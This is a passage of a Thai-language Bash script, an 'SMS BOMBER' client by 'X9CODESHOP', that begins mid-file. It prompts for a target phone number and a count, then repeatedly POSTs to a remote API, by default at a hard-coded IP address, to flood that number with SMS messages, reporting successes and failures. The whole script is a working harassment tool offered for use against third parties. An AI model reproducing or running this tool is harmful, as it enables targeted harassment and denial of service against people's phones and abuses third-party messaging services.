    clear 2>/dev/null || true
    echo ""
    echo -e "${MAGENTA}    ╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}    ║${NC}                                                           ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}   ${RED}▄▄▄  ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄${NC}   ${YELLOW}███████╗███╗   ███╗███████╗${NC}   ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}   ${RED}█  █ █   █ █   █ █${NC}       ${YELLOW}██╔════╝████╗ ████║██╔════╝${NC}   ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}   ${RED}▀▀▀▄ █   █ █▄▄▄█ █▄▄▄▄${NC}  ${YELLOW}███████╗██╔████╔██║█████╗  ${NC}   ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}   ${RED}▄  █ █   █     █     █${NC}  ${YELLOW}╚════██║██║╚██╔╝██║██╔══╝  ${NC}   ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}   ${RED}▀▀▀  ▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀${NC}  ${YELLOW}███████║██║ ╚═╝ ██║███████╗${NC}   ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}                               ${YELLOW}╚══════╝╚═╝     ╚═╝╚══════╝${NC}   ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}                                                           ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}          ${CYAN}💣 SMS BOMBER - API Client${NC}                     ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}          ${GRAY}v${VERSION} | by DeV ต้น X9CODESHOP${NC}                 ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}          ${GRAY}API: ${API_URL}${NC}                                ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ║${NC}                                                           ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}    ╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ─── Check Dependencies ───────────────────────────────────────────────────────
check_deps() {
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}❌ กรุณาติดตั้ง curl ก่อน${NC}"
        echo -e "${GRAY}   apt install curl หรือ yum install curl${NC}"
        exit 1
    fi
}

# ─── Check API ────────────────────────────────────────────────────────────────
check_api() {
    echo -e "${CYAN}📡 กำลังตรวจสอบ API...${NC}"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "${API_URL}/health" --max-time 5 2>/dev/null)
    
    if [ "$response" != "200" ]; then
        echo -e "${RED}❌ API ไม่ตอบสนอง (HTTP $response)${NC}"
        echo -e "${GRAY}   URL: ${API_URL}${NC}"
        exit 1
    else
        echo -e "${GREEN}✅ API พร้อมใช้งาน${NC}"
    fi
}

# ─── Send SMS via API ─────────────────────────────────────────────────────────
send_sms_api() {
    local phone=$1
    local count=$2
    local success_count=0
    local fail_count=0
    
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║${NC}                    ${BOLD}🚀 เริ่มยิง SMS${NC}                        ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    for ((i=1; i<=count; i++)); do
        printf "\r${CYAN}📤 กำลังส่ง: ${BOLD}%d/%d${NC}  |  ${GREEN}สำเร็จ: %d${NC}  |  ${RED}ล้มเหลว: %d${NC}" "$i" "$count" "$success_count" "$fail_count"
        
        # ส่ง request ไปยัง API
        response=$(curl -s -X POST "${API_URL}/send" \
            -H "Content-Type: application/json" \
            -d "{\"phone\":\"$phone\",\"count\":1}" \
            --max-time 15 2>/dev/null)
        
        if echo "$response" | grep -q '"success":true'; then
            ((success_count++))
        else
            ((fail_count++))
        fi
        
        # ดีเลย์เล็กน้อย
        sleep 0.3
    done
    
    echo ""
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║${NC}                    ${BOLD}📊 สรุปผลลัพธ์${NC}                        ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}╠═══════════════════════════════════════════════════════════╣${NC}"
    printf "${MAGENTA}║${NC}  📱 เบอร์เป้าหมาย: ${BOLD}%s${NC}%*s${MAGENTA}║${NC}\n" "$phone" $((35 - ${#phone})) ""
    printf "${MAGENTA}║${NC}  📨 จำนวนทั้งหมด: ${BOLD}%d${NC} ครั้ง%*s${MAGENTA}║${NC}\n" "$count" $((26 - ${#count})) ""
    printf "${MAGENTA}║${NC}  ${GREEN}✅ สำเร็จ: %d ครั้ง${NC}%*s${MAGENTA}║${NC}\n" "$success_count" $((32 - ${#success_count})) ""
    printf "${MAGENTA}║${NC}  ${RED}❌ ล้มเหลว: %d ครั้ง${NC}%*s${MAGENTA}║${NC}\n" "$fail_count" $((33 - ${#fail_count})) ""
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}"
}

# ─── Interactive Mode ─────────────────────────────────────────────────────────
interactive_mode() {
    show_banner
    check_deps
    check_api
    echo ""
    
    # รับเบอร์โทร
    echo -e "${CYAN}📱 กรุณาใส่เบอร์โทรศัพท์เป้าหมาย${NC}"
    echo -e "${GRAY}   (ตัวอย่าง: 0812345678)${NC}"
    echo ""
    read -p "   ➤ เบอร์โทร: " phone
    
    # ตรวจสอบเบอร์
    if [[ ! "$phone" =~ ^[0-9]{10}$ ]]; then
        echo ""
        echo -e "${RED}❌ เบอร์โทรไม่ถูกต้อง! ต้องเป็นตัวเลข 10 หลัก${NC}"
        exit 1
    fi
    
    echo ""
    
    # รับจำนวน
    echo -e "${CYAN}🔢 กรุณาใส่จำนวนครั้งที่ต้องการยิง${NC}"
    echo -e "${GRAY}   (แนะนำ: 10-100)${NC}"
    echo ""
    read -p "   ➤ จำนวน: " count
    
    # ตรวจสอบจำนวน
    if [[ ! "$count" =~ ^[0-9]+$ ]] || [ "$count" -lt 1 ] || [ "$count" -gt 100 ]; then
        echo ""
        echo -e "${RED}❌ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100${NC}"
        exit 1
    fi
    
    echo ""
    echo -e "${YELLOW}⚠️  ยืนยันการยิง SMS?${NC}"
    echo -e "   เบอร์: ${BOLD}$phone${NC}"
    echo -e "   จำนวน: ${BOLD}$count${NC} ครั้ง"
    echo ""
    read -p "   ยืนยัน (y/n): " confirm
    
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo ""
        echo -e "${CYAN}ℹ️ ยกเลิกการยิง${NC}"
        exit 0
    fi
    
    # เริ่มยิง
    send_sms_api "$phone" "$count"
    
    echo ""
    echo -e "${CYAN}🙏 ขอบคุณที่ใช้ SMS BOMBER${NC}"
    echo ""
}

# ─── Quick Mode (Arguments) ───────────────────────────────────────────────────
quick_mode() {
    local phone=$1
    local count=$2
    
    check_deps
    
    # Validate
    if [[ ! "$phone" =~ ^[0-9]{10}$ ]]; then
        echo -e "${RED}❌ เบอร์โทรไม่ถูกต้อง! ต้องเป็นตัวเลข 10 หลัก${NC}"
        exit 1
    fi
    
    if [[ ! "$count" =~ ^[0-9]+$ ]] || [ "$count" -lt 1 ] || [ "$count" -gt 100 ]; then
        echo -e "${RED}❌ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100${NC}"
        exit 1
    fi
    
    check_api
    send_sms_api "$phone" "$count"
}

# ─── Show Help ────────────────────────────────────────────────────────────────
show_help() {
    show_banner
    echo "📖 วิธีใช้: $0 [เบอร์] [จำนวน]"
    echo ""
    echo "ตัวอย่าง:"
    echo "  $0                  - โหมด Interactive (ถามข้อมูล)"
    echo "  $0 0812345678 10    - ยิงทันที 10 ครั้ง"
    echo "  $0 help             - แสดงวิธีใช้"
    echo ""
    echo "ตัวแปรแวดล้อม:"
    echo "  SMS_API_URL         - เปลี่ยน URL API (ค่าเริ่มต้น: http://141.98.17.37:3000)"
    echo ""
    echo "ตัวอย่างเปลี่ยน API:"
    echo "  SMS_API_URL=http://localhost:3000 $0 0812345678 10"
}

# ─── Main ─────────────────────────────────────────────────────────────────────
case "$1" in
    help|-h|--help)
        show_help
        ;;
    "")
        interactive_mode
        ;;
    *)
        if [ -z "$2" ]; then
            show_help
            exit 1
        fi
        quick_mode "$1" "$2"
        ;;
esac
